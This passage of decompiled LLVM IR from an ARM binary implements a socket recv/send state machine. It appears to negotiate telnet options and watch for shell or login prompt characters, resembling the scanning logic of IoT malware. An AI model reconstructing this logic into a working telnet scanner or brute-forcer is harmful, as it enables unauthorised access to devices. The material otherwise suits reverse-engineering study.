  br i1 %v3_13000, label %dec_label_pc_12fc8, label %dec_label_pc_13a8c

dec_label_pc_13008:                               ; preds = %dec_label_pc_13218, %dec_label_pc_131ec, %dec_label_pc_13234
  store i32 %v3_131ec, i32* %r1.global-to-local, align 4
  %v0_1300c = load i32, i32* @sb, align 4
  store i32 %v0_1300c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1519c.382 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_13018 = call i32 @function_146d0(i32 %v0_1300c, i32 %v3_131ec, i32 ptrtoint ([5 x i8]* @global_var_1519c.382 to i32), i32 4)
  store i32 %v5_13018, i32* %r0.global-to-local, align 4
  %v3_1301c = icmp eq i32 %v5_13018, -1
  store i1 %v3_1301c, i1* %cpsr_c.global-to-local, align 1
  %v8_1301c = icmp eq i32 %v5_13018, -1
  store i1 %v8_1301c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13018, i32* @r7, align 4
  br i1 %v3_1301c, label %dec_label_pc_13028, label %dec_label_pc_13240

dec_label_pc_13028:                               ; preds = %dec_label_pc_13008
  %v0_13028 = load i32, i32* @sb, align 4
  store i32 %v0_13028, i32* %r0.global-to-local, align 4
  %v0_1302c = load i32, i32* @r5, align 4
  %v1_1302c = add i32 %v0_1302c, 24
  %v2_1302c = inttoptr i32 %v1_1302c to i32*
  %v3_1302c = load i32, i32* %v2_1302c, align 4
  store i32 %v3_1302c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_151a4.384 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_13038 = call i32 @function_146d0(i32 %v0_13028, i32 %v3_1302c, i32 ptrtoint ([6 x i8]* @global_var_151a4.384 to i32), i32 5)
  store i32 %v5_13038, i32* %r0.global-to-local, align 4
  %v3_1303c = icmp eq i32 %v5_13038, -1
  store i1 %v3_1303c, i1* %cpsr_c.global-to-local, align 1
  %v8_1303c = icmp eq i32 %v5_13038, -1
  store i1 %v8_1303c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13038, i32* @r7, align 4
  br i1 %v3_1303c, label %dec_label_pc_13048.loopexit, label %dec_label_pc_13240

dec_label_pc_13048.loopexit:                      ; preds = %dec_label_pc_131dc, %dec_label_pc_1371c, %dec_label_pc_130cc, %dec_label_pc_13028, %dec_label_pc_139f8
  %v0_13048 = load i32, i32* @r5, align 4
  %v1_13048 = add i32 %v0_13048, 12
  %v2_13048 = inttoptr i32 %v1_13048 to i32*
  %v3_13048 = load i32, i32* %v2_13048, align 4
  store i32 %v3_13048, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1304c100 = icmp eq i32 %v3_13048, 0
  store i1 %v2_1304c100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1304c100, label %dec_label_pc_12ee4, label %dec_label_pc_13054.lr.ph

dec_label_pc_13054.lr.ph:                         ; preds = %dec_label_pc_13048.preheader, %dec_label_pc_13048.loopexit
  %v0_13054132 = phi i32 [ %v0_13048, %dec_label_pc_13048.loopexit ], [ %v0_13048101, %dec_label_pc_13048.preheader ]
  br label %dec_label_pc_13054

dec_label_pc_1304cthread-pre-split.thread:        ; preds = %dec_label_pc_13414, %dec_label_pc_134c8, %dec_label_pc_1357c, %dec_label_pc_13630, %dec_label_pc_1383c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13054

dec_label_pc_1304cthread-pre-split:               ; preds = %dec_label_pc_1345c, %dec_label_pc_13510, %dec_label_pc_135c4, %dec_label_pc_13678, %dec_label_pc_13884, %dec_label_pc_13868, %dec_label_pc_135a8, %dec_label_pc_1365c, %dec_label_pc_134f4, %dec_label_pc_13440
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %dec_label_pc_1304cthread-pre-split.thread, %dec_label_pc_1304cthread-pre-split, %dec_label_pc_13054.lr.ph
  %v0_13a44 = phi i32 [ %v0_13054132, %dec_label_pc_13054.lr.ph ], [ %v0_130cc, %dec_label_pc_1304cthread-pre-split ], [ %v0_130cc, %dec_label_pc_1304cthread-pre-split.thread ]
  %v1_13054 = add i32 %v0_13a44, 24
  %v2_13054 = inttoptr i32 %v1_13054 to i32*
  %v3_13054 = load i32, i32* %v2_13054, align 4
  store i32 %v3_13054, i32* %r3.global-to-local, align 4
  %v2_13058 = icmp ugt i32 %v3_13054, 255
  store i1 %v2_13058, i1* %cpsr_c.global-to-local, align 1
  %v7_13058 = icmp eq i32 %v3_13054, 256
  store i1 %v7_13058, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_13a44, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_13058, label %dec_label_pc_13a44, label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %dec_label_pc_13054, %dec_label_pc_13a44
  store i32 %stack_var_-1868.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v2_1306c, align 4
  %v0_13070 = load i32, i32* @r5, align 4
  %v1_13070 = add i32 %v0_13070, 24
  %v2_13070 = inttoptr i32 %v1_13070 to i32*
  %v3_13070 = load i32, i32* %v2_13070, align 4
  store i32 %v3_13070, i32* %r2.global-to-local, align 4
  %v0_13074 = load i32, i32* @sb, align 4
  %v2_13074 = add i32 %v0_13074, %v3_13070
  store i32 %v2_13074, i32* @r4, align 4
  %v1_13078 = add i32 %v0_13070, 4
  %v2_13078 = inttoptr i32 %v1_13078 to i32*
  %v3_13078 = load i32, i32* %v2_13078, align 4
  store i32 %v3_13078, i32* %r0.global-to-local, align 4
  %v1_1307c = sub i32 256, %v3_13070
  store i32 %v1_1307c, i32* %r2.global-to-local, align 4
  store i32 %v2_13074, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_13088 = call i32 @_recv(i32 %v3_13078, i32 %v2_13074, i32 %v1_1307c, i32 16384)
  store i32 %v4_13088, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1308c = icmp eq i32 %v4_13088, 0
  store i1 %v2_1308c, i1* %cpsr_z.global-to-local, align 1
  %tmp312 = icmp slt i32 %v4_13088, 1
  br i1 %tmp312, label %dec_label_pc_1399c, label %dec_label_pc_13094

dec_label_pc_13094:                               ; preds = %dec_label_pc_13064
  %v0_13094 = load i32, i32* @r6, align 4
  store i32 %v0_13094, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %bb314, %dec_label_pc_13094
  %v3_130a4 = phi i32 [ %v1_130a8, %bb314 ], [ %v0_13094, %dec_label_pc_13094 ]
  %v1_1309c = load i32, i32* @r4, align 4
  %v2_1309c = add i32 %v1_1309c, %v3_130a4
  %v3_1309c = inttoptr i32 %v2_1309c to i8*
  %v4_1309c = load i8, i8* %v3_1309c, align 1
  %v6_1309c = zext i8 %v4_1309c to i32
  store i32 %v6_1309c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_130a0 = icmp eq i8 %v4_1309c, 0
  store i1 %v2_130a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_130a0, label %bb313, label %bb314

bb313:                                            ; preds = %dec_label_pc_1309c
  %v1_130a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_130a4 = trunc i32 %v1_130a4 to i8
  store i8 %v2_130a4, i8* %v3_1309c, align 1
  %v0_130a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb314

bb314:                                            ; preds = %dec_label_pc_1309c, %bb313
  %v0_130a8 = phi i32 [ %v3_130a4, %dec_label_pc_1309c ], [ %v0_130a8.pre, %bb313 ]
  %v1_130a8 = add i32 %v0_130a8, 1
  store i32 %v1_130a8, i32* %r2.global-to-local, align 4
  %v3_130ac = icmp uge i32 %v4_13088, %v1_130a8
  store i1 %v3_130ac, i1* %cpsr_c.global-to-local, align 1
  %v9_130ac = icmp eq i32 %v4_13088, %v1_130a8
  store i1 %v9_130ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_130ac, label %dec_label_pc_130b4, label %dec_label_pc_1309c

dec_label_pc_130b4:                               ; preds = %bb314, %dec_label_pc_139a0
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %lr.global-to-local, align 4
  %v0_130b8 = load i32, i32* @r5, align 4
  %v1_130b8 = add i32 %v0_130b8, 24
  %v2_130b8 = inttoptr i32 %v1_130b8 to i32*
  %v3_130b8 = load i32, i32* %v2_130b8, align 4
  %v2_130bc = load i32, i32* @global_var_1d9a8.243, align 4
  store i32 %v2_130bc, i32* %r3.global-to-local, align 4
  %v2_130c0 = add i32 %v3_130b8, %v4_13088
  store i32 %v2_130c0, i32* %ip.global-to-local, align 4
  store i32 %v2_130c0, i32* %v2_130b8, align 4
  %v0_130c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_130c8 = load i32, i32* @r5, align 4
  %v2_130c8 = add i32 %v1_130c8, 8
  %v3_130c8 = inttoptr i32 %v2_130c8 to i32*
  store i32 %v0_130c8, i32* %v3_130c8, align 4
  br label %dec_label_pc_130cc

dec_label_pc_130cc:                               ; preds = %dec_label_pc_13818, %dec_label_pc_130b4
  %v0_130cc = load i32, i32* @r5, align 4
  %v1_130cc = add i32 %v0_130cc, 12
  %v2_130cc = inttoptr i32 %v1_130cc to i32*
  %v3_130cc = load i32, i32* %v2_130cc, align 4
  store i32 %v3_130cc, i32* %r2.global-to-local, align 4
  %v1_130d0 = add i32 %v3_130cc, -2
  store i32 %v1_130d0, i32* %r3.global-to-local, align 4
  %v7_130d4 = icmp eq i32 %v1_130d0, 8
  store i1 %v7_130d4, i1* %cpsr_z.global-to-local, align 1
  %v5_130d8 = and i32 %v1_130d0, 1073741824
  %v6_130d8 = icmp ne i32 %v5_130d8, 0
  store i1 %v6_130d8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_130cc, label %dec_label_pc_13048.loopexit [
    i32 2, label %dec_label_pc_13104
    i32 3, label %dec_label_pc_131ec
    i32 4, label %dec_label_pc_13384
    i32 5, label %dec_label_pc_13414
    i32 6, label %dec_label_pc_134c8
    i32 7, label %dec_label_pc_13630
    i32 8, label %dec_label_pc_1357c
    i32 9, label %dec_label_pc_1383c
    i32 10, label %dec_label_pc_136e4
  ]

dec_label_pc_13104:                               ; preds = %dec_label_pc_130cc
  %v1_13108 = add i32 %v0_130cc, 24
  %v2_13108 = inttoptr i32 %v1_13108 to i32*
  %v3_13108 = load i32, i32* %v2_13108, align 4
  store i32 %v3_13108, i32* %ip.global-to-local, align 4
  %v0_1310c = load i32, i32* @sb, align 4
  store i32 %v0_1310c, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v1_13120 = add i32 %v0_130cc, 29
  store i32 %v1_13120, i32* @r4, align 4
  %v3_1312491 = icmp eq i32 %v3_13108, 0
  store i1 %v3_1312491, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_1312491, i1* %cpsr_z.global-to-local, align 1
  %v6_1312898 = icmp sgt i32 %v3_13108, 0
  br i1 %v6_1312898, label %dec_label_pc_1312c.preheader, label %dec_label_pc_131cc

dec_label_pc_13124.loopexit:                      ; preds = %dec_label_pc_13144
  %v2_1314c = add i32 %v1_1314c, 2
  store i32 %v2_1314c, i32* @r6, align 4
  %v2_13150 = add i32 %v1_13150, 2
  store i32 %v2_13150, i32* @r4, align 4
  %v2_13154 = add i32 %v1_13154, 2
  store i32 %v2_13154, i32* @r7, align 4
  %v3_13124 = icmp uge i32 %v2_13154, %v1_13124
  store i1 %v3_13124, i1* %cpsr_c.global-to-local, align 1
  %v9_13124 = icmp eq i32 %v2_13154, %v1_13124
  store i1 %v9_13124, i1* %cpsr_z.global-to-local, align 1
  %v6_13128 = icmp slt i32 %v2_13154, %v1_13124
  br i1 %v6_13128, label %dec_label_pc_1312c.preheader, label %dec_label_pc_131cc

dec_label_pc_1312c.preheader:                     ; preds = %dec_label_pc_13104, %dec_label_pc_13124.loopexit
  %v6_131d4168 = phi i32 [ %v6_131d4169, %dec_label_pc_13124.loopexit ], [ %v0_130cc, %dec_label_pc_13104 ]
  %v1_13154157 = phi i32 [ %v2_13154, %dec_label_pc_13124.loopexit ], [ 0, %dec_label_pc_13104 ]
  %v1_1314c155 = phi i32 [ %v2_1314c, %dec_label_pc_13124.loopexit ], [ %v0_1310c, %dec_label_pc_13104 ]
  %v1_13138153 = phi i32 [ %v1_13124, %dec_label_pc_13124.loopexit ], [ %v3_13108, %dec_label_pc_13104 ]
  %v0_1312c151 = phi i32 [ %v2_13150, %dec_label_pc_13124.loopexit ], [ %v1_13120, %dec_label_pc_13104 ]
  br label %dec_label_pc_1312c

dec_label_pc_1312c:                               ; preds = %dec_label_pc_1312c.preheader, %dec_label_pc_131ac
  %v6_131d4169 = phi i32 [ %v6_131d4168, %dec_label_pc_1312c.preheader ], [ %v0_131b4, %dec_label_pc_131ac ]
  %v1_13154 = phi i32 [ %v1_13154157, %dec_label_pc_1312c.preheader ], [ %v1_131b8, %dec_label_pc_131ac ]
  %v1_1314c = phi i32 [ %v1_1314c155, %dec_label_pc_1312c.preheader ], [ %v1_131c0, %dec_label_pc_131ac ]
  %v1_13124 = phi i32 [ %v1_13138153, %dec_label_pc_1312c.preheader ], [ %v3_131b4, %dec_label_pc_131ac ]
  %v1_13150 = phi i32 [ %v0_1312c151, %dec_label_pc_1312c.preheader ], [ %v1_131c4, %dec_label_pc_131ac ]
  %v1_1312c = add i32 %v1_13150, -1
  %v2_1312c = inttoptr i32 %v1_1312c to i8*
  %v3_1312c = load i8, i8* %v2_1312c, align 1
  %v4_1312c = zext i8 %v3_1312c to i32
  store i32 %v4_1312c, i32* %r3.global-to-local, align 4
  %v2_13130 = icmp eq i8 %v3_1312c, -1
  store i1 %v2_13130, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_13130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13130, label %dec_label_pc_13138, label %dec_label_pc_131cc

dec_label_pc_13138:                               ; preds = %dec_label_pc_1312c
  %v0_13138 = load i32, i32* @sb, align 4
  %v2_13138 = add i32 %v0_13138, %v1_13124
  store i32 %v2_13138, i32* %r2.global-to-local, align 4
  %v3_1313c = icmp uge i32 %v2_13138, %v1_13150
  store i1 %v3_1313c, i1* %cpsr_c.global-to-local, align 1
  %v9_1313c = icmp eq i32 %v2_13138, %v1_13150
  store i1 %v9_1313c, i1* %cpsr_z.global-to-local, align 1
  %v2_13140 = xor i1 %v3_1313c, true
  %v3_13140 = or i1 %v9_1313c, %v2_13140
  br i1 %v3_13140, label %dec_label_pc_131cc, label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %dec_label_pc_13138
  %v1_13144 = inttoptr i32 %v1_13150 to i8*
  %v2_13144 = load i8, i8* %v1_13144, align 1
  %v3_13144 = zext i8 %v2_13144 to i32
  store i32 %v3_13144, i32* %r3.global-to-local, align 4
  %v2_13148 = icmp eq i8 %v2_13144, -1
  store i1 %v2_13148, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_13148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13148, label %dec_label_pc_13124.loopexit, label %dec_label_pc_1315c

dec_label_pc_1315c:                               ; preds = %dec_label_pc_13144
  %v2_1315c = icmp ugt i8 %v2_13144, -4
  store i1 %v2_1315c, i1* %cpsr_c.global-to-local, align 1
  %v7_1315c = icmp eq i8 %v2_13144, -3
  store i1 %v7_1315c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1315c, label %dec_label_pc_138f0, label %dec_label_pc_13164

dec_label_pc_13164:                               ; preds = %dec_label_pc_1315c
  %v1_13164 = add i32 %v1_1314c, 2
  store i32 %v1_13164, i32* %r3.global-to-local, align 4
  %v3_13168 = icmp uge i32 %v2_13138, %v1_13164
  store i1 %v3_13168, i1* %cpsr_c.global-to-local, align 1
  %v9_13168 = icmp eq i32 %v2_13138, %v1_13164
  store i1 %v9_13168, i1* %cpsr_z.global-to-local, align 1
  %v2_1316c = xor i1 %v3_13168, true
  %v3_1316c = or i1 %v9_13168, %v2_1316c
  br i1 %v3_1316c, label %dec_label_pc_131cc, label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %bb344, %dec_label_pc_13944, %bb343, %dec_label_pc_13164
  %v0_13170 = load i32, i32* @r4, align 4
  %v1_13170 = inttoptr i32 %v0_13170 to i8*
  %v2_13170 = load i8, i8* %v1_13170, align 1
  %v3_13170 = zext i8 %v2_13170 to i32
  store i32 %v3_13170, i32* %r3.global-to-local, align 4
  %v2_13174 = icmp ugt i8 %v2_13170, -4
  store i1 %v2_13174, i1* %cpsr_c.global-to-local, align 1
  %v7_13174 = icmp eq i8 %v2_13170, -3
  store i1 %v7_13174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13174, label %bb315, label %dec_label_pc_13180

bb315:                                            ; preds = %dec_label_pc_13170
  %v1_13178 = load i32, i32* @r8, align 4
  %v2_13178 = trunc i32 %v1_13178 to i8
  store i8 %v2_13178, i8* %v1_13170, align 1
  %v0_1317c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1317c.pr, label %bb317, label %.dec_label_pc_13180_crit_edge

.dec_label_pc_13180_crit_edge:                    ; preds = %bb315
  %v0_13180.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13180

dec_label_pc_13180:                               ; preds = %.dec_label_pc_13180_crit_edge, %dec_label_pc_13170
  %v0_13180 = phi i32 [ %v0_13180.pre, %.dec_label_pc_13180_crit_edge ], [ %v3_13170, %dec_label_pc_13170 ]
  %v2_13180 = icmp ugt i32 %v0_13180, 250
  store i1 %v2_13180, i1* %cpsr_c.global-to-local, align 1
  %v7_13180 = icmp eq i32 %v0_13180, 251
  store i1 %v7_13180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13180, label %bb316, label %bb317

bb316:                                            ; preds = %dec_label_pc_13180
  %v1_13184 = load i32, i32* %sl.global-to-local, align 4
  %v2_13184 = trunc i32 %v1_13184 to i8
  %v3_13184 = load i32, i32* @r4, align 4
  %v4_13184 = inttoptr i32 %v3_13184 to i8*
  store i8 %v2_13184, i8* %v4_13184, align 1
  br label %bb317

bb317:                                            ; preds = %bb315, %dec_label_pc_13180, %bb316
  %v0_13188 = load i32, i32* @r4, align 4
  %v1_13188 = add i32 %v0_13188, 1
  %v2_13188 = inttoptr i32 %v1_13188 to i8*
  %v3_13188 = load i8, i8* %v2_13188, align 1
  %v4_13188 = zext i8 %v3_13188 to i32
  store i32 %v4_13188, i32* %r3.global-to-local, align 4
  %v2_1318c = icmp ugt i8 %v3_13188, -4
  store i1 %v2_1318c, i1* %cpsr_c.global-to-local, align 1
  %v7_1318c = icmp eq i8 %v3_13188, -3
  store i1 %v7_1318c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1318c, label %bb318, label %dec_label_pc_13198

bb318:                                            ; preds = %bb317
  %v1_13190 = load i32, i32* @r8, align 4
  %v2_13190 = trunc i32 %v1_13190 to i8
  store i8 %v2_13190, i8* %v2_13188, align 1
  %v0_13194.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13194.pr, label %bb320, label %.dec_label_pc_13198_crit_edge

.dec_label_pc_13198_crit_edge:                    ; preds = %bb318
  %v0_13198.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %.dec_label_pc_13198_crit_edge, %bb317
  %v0_13198 = phi i32 [ %v0_13198.pre, %.dec_label_pc_13198_crit_edge ], [ %v4_13188, %bb317 ]
  %v2_13198 = icmp ugt i32 %v0_13198, 250
  store i1 %v2_13198, i1* %cpsr_c.global-to-local, align 1
  %v7_13198 = icmp eq i32 %v0_13198, 251
  store i1 %v7_13198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13198, label %bb319, label %bb320

bb319:                                            ; preds = %dec_label_pc_13198
  %v1_1319c = load i32, i32* %sl.global-to-local, align 4
  %v2_1319c = trunc i32 %v1_1319c to i8
  %v3_1319c = load i32, i32* @r4, align 4
  %v4_1319c = add i32 %v3_1319c, 1
  %v5_1319c = inttoptr i32 %v4_1319c to i8*
  store i8 %v2_1319c, i8* %v5_1319c, align 1
  br label %bb320

bb320:                                            ; preds = %bb318, %dec_label_pc_13198, %bb319
  %v0_131a0 = load i32, i32* @r5, align 4
  %v1_131a0 = add i32 %v0_131a0, 4
  %v2_131a0 = inttoptr i32 %v1_131a0 to i32*
  %v3_131a0 = load i32, i32* %v2_131a0, align 4
  store i32 %v3_131a0, i32* %r0.global-to-local, align 4
  %v0_131a4 = load i32, i32* @r6, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13a1c, %bb320
  %v0_131b0 = phi i32 [ %v3_13a34, %dec_label_pc_13a1c ], [ %v3_131a0, %bb320 ]
  %storemerge5 = phi i32 [ %v2_13908, %dec_label_pc_13a1c ], [ %v0_131a4, %bb320 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_13a1c ], [ 3, %bb320 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_131b0 = call i32 @_send(i32 %v0_131b0, i32 %storemerge5, i32 %storemerge, i32 16384)
  store i32 %v4_131b0, i32* %r0.global-to-local, align 4
  %v0_131b4 = load i32, i32* @r5, align 4
  %v1_131b4 = add i32 %v0_131b4, 24
  %v2_131b4 = inttoptr i32 %v1_131b4 to i32*
  %v3_131b4 = load i32, i32* %v2_131b4, align 4
  store i32 %v3_131b4, i32* %ip.global-to-local, align 4
  %v0_131b8 = load i32, i32* @r7, align 4
  %v1_131b8 = add i32 %v0_131b8, 3
  store i32 %v1_131b8, i32* @r7, align 4
  %v3_131bc = icmp uge i32 %v1_131b8, %v3_131b4
  store i1 %v3_131bc, i1* %cpsr_c.global-to-local, align 1
  %v9_131bc = icmp eq i32 %v1_131b8, %v3_131b4
  store i1 %v9_131bc, i1* %cpsr_z.global-to-local, align 1
  %v0_131c0 = load i32, i32* @r6, align 4
  %v1_131c0 = add i32 %v0_131c0, 3
  store i32 %v1_131c0, i32* @r6, align 4
  %v0_131c4 = load i32, i32* @r4, align 4
  %v1_131c4 = add i32 %v0_131c4, 3
  store i32 %v1_131c4, i32* @r4, align 4
  %v5_131c8 = icmp slt i32 %v1_131b8, %v3_131b4
  br i1 %v5_131c8, label %dec_label_pc_1312c, label %dec_label_pc_131cc

dec_label_pc_131cc:                               ; preds = %dec_label_pc_13124.loopexit, %dec_label_pc_1312c, %dec_label_pc_131ac, %dec_label_pc_13164, %dec_label_pc_13138, %dec_label_pc_13104, %dec_label_pc_138f0.dec_label_pc_131cc.loopexit_crit_edge
  %v6_131d4 = phi i32 [ %v0_13914, %dec_label_pc_138f0.dec_label_pc_131cc.loopexit_crit_edge ], [ %v0_130cc, %dec_label_pc_13104 ], [ %v6_131d4169, %dec_label_pc_1312c ], [ %v0_131b4, %dec_label_pc_131ac ], [ %v6_131d4169, %dec_label_pc_13164 ], [ %v6_131d4169, %dec_label_pc_13138 ], [ %v6_131d4169, %dec_label_pc_13124.loopexit ]
  %v0_131dc.pre = phi i32 [ %v0_131cc.pre.pre, %dec_label_pc_138f0.dec_label_pc_131cc.loopexit_crit_edge ], [ 0, %dec_label_pc_13104 ], [ %v1_13154, %dec_label_pc_1312c ], [ %v1_131b8, %dec_label_pc_131ac ], [ %v1_13154, %dec_label_pc_13164 ], [ %v1_13154, %dec_label_pc_13138 ], [ %v2_13154, %dec_label_pc_13124.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_131cc = icmp eq i32 %v0_131dc.pre, 0
  store i1 %v2_131cc, i1* %cpsr_z.global-to-local, align 1
  %tmp321 = icmp slt i32 %v0_131dc.pre, 1
  br i1 %tmp321, label %dec_label_pc_131dc, label %.thread204

.thread204:                                       ; preds = %dec_label_pc_131cc
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_131d4 = add i32 %v6_131d4, 12
  %v8_131d4 = inttoptr i32 %v7_131d4 to i32*
  store i32 3, i32* %v8_131d4, align 4
  br label %dec_label_pc_13818

dec_label_pc_131dc:                               ; preds = %dec_label_pc_131cc, %dec_label_pc_13890, %dec_label_pc_13768, %dec_label_pc_13684, %dec_label_pc_135d0, %dec_label_pc_1351c, %dec_label_pc_13468, %dec_label_pc_133d0, %dec_label_pc_13240
  %v0_131dc = phi i32 [ %v1_13884, %dec_label_pc_13890 ], [ %v0_13760, %dec_label_pc_13768 ], [ %v1_13678, %dec_label_pc_13684 ], [ %v1_135c4, %dec_label_pc_135d0 ], [ %v1_13510, %dec_label_pc_1351c ], [ %v1_1345c, %dec_label_pc_13468 ], [ %v0_133d0, %dec_label_pc_133d0 ], [ %v0_13240, %dec_label_pc_13240 ], [ %v0_131dc.pre, %dec_label_pc_131cc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_131dc = icmp eq i32 %v0_131dc, 0
  store i1 %v2_131dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_131dc, label %dec_label_pc_13048.loopexit, label %dec_label_pc_131e4

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131dc
  %v0_131e4 = load i32, i32* @r5, align 4
  %v1_131e4 = add i32 %v0_131e4, 24
  %v2_131e4 = inttoptr i32 %v1_131e4 to i32*
  %v3_131e4 = load i32, i32* %v2_131e4, align 4
  store i32 %v3_131e4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13818

dec_label_pc_131ec:                               ; preds = %dec_label_pc_130cc
  %v1_131ec = add i32 %v0_130cc, 24
  %v2_131ec = inttoptr i32 %v1_131ec to i32*
  %v3_131ec = load i32, i32* %v2_131ec, align 4
  store i32 %v3_131ec, i32* %ip.global-to-local, align 4
  %v1_131f0 = add i32 %v3_131ec, -1
  store i32 %v1_131f0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_131f4 = icmp eq i32 %v1_131f0, 0
  store i1 %v2_131f4, i1* %cpsr_z.global-to-local, align 1
  %v5_131f8 = icmp sgt i32 %v1_131f0, 0
  br i1 %v5_131f8, label %dec_label_pc_13220, label %dec_label_pc_13008

dec_label_pc_13200:                               ; preds = %bb322
  %v2_13200 = icmp ugt i8 %v3_13224, 35
  store i1 %v2_13200, i1* %cpsr_c.global-to-local, align 1
  %v7_13200 = icmp eq i8 %v3_13224, 36
  store i1 %v7_13200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13200, label %dec_label_pc_13234, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_13200
  %v2_13208 = icmp ugt i8 %v3_13224, 34
  store i1 %v2_13208, i1* %cpsr_c.global-to-local, align 1
  %v7_13208 = icmp eq i8 %v3_13224, 35
  store i1 %v7_13208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13208, label %dec_label_pc_13234, label %dec_label_pc_13210

dec_label_pc_13210:                               ; preds = %dec_label_pc_13208
  %v2_13210 = icmp ugt i8 %v3_13224, 36
  store i1 %v2_13210, i1* %cpsr_c.global-to-local, align 1
  %v7_13210 = icmp eq i8 %v3_13224, 37
  store i1 %v7_13210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13210, label %dec_label_pc_13234, label %dec_label_pc_13218

dec_label_pc_13218:                               ; preds = %dec_label_pc_13210
  %v1_13218 = add i32 %v0_13234, -1
  store i32 %v1_13218, i32* %r0.global-to-local, align 4
  %v2_13218 = icmp ne i32 %v0_13234, 0
  store i1 %v2_13218, i1* %cpsr_c.global-to-local, align 1
  %v7_13218 = icmp eq i32 %v0_13234, 1
  store i1 %v7_13218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13218, label %dec_label_pc_13008, label %dec_label_pc_13220

dec_label_pc_13220:                               ; preds = %dec_label_pc_131ec, %dec_label_pc_13218
  %v0_13234 = phi i32 [ %v1_13218, %dec_label_pc_13218 ], [ %v1_131f0, %dec_label_pc_131ec ]
  %v2_13220 = add i32 %v0_13234, %v0_130cc
  store i32 %v2_13220, i32* %r3.global-to-local, align 4
  %v1_13224 = add i32 %v2_13220, 28
  %v2_13224 = inttoptr i32 %v1_13224 to i8*
  %v3_13224 = load i8, i8* %v2_13224, align 1
  %v4_13224 = zext i8 %v3_13224 to i32
  store i32 %v4_13224, i32* %r3.global-to-local, align 4
  %v2_13228 = icmp ugt i8 %v3_13224, 61
  store i1 %v2_13228, i1* %cpsr_c.global-to-local, align 1
  %v7_13228 = icmp eq i8 %v3_13224, 62
  store i1 %v7_13228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13228, label %dec_label_pc_13234, label %bb322

bb322:                                            ; preds = %dec_label_pc_13220
  %v3_1322c = icmp ugt i8 %v3_13224, 57
  store i1 %v3_1322c, i1* %cpsr_c.global-to-local, align 1
  %v8_1322c = icmp eq i8 %v3_13224, 58
  store i1 %v8_1322c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1322c, label %dec_label_pc_13234, label %dec_label_pc_13200

dec_label_pc_13234:                               ; preds = %dec_label_pc_13220, %bb322, %dec_label_pc_13210, %dec_label_pc_13208, %dec_label_pc_13200
